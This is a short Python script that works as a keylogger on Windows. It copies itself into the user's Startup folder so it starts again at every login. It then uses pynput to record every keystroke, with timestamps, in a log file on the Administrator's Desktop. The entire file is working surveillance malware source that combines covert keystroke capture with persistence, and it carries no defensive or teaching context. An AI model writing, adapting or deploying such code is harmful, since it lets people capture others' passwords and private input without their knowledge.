from typing import Text
from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = "Administrator"
logging_directory = f"C:/Users/{username}/Desktop"

copyfile('main.py', f'c:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()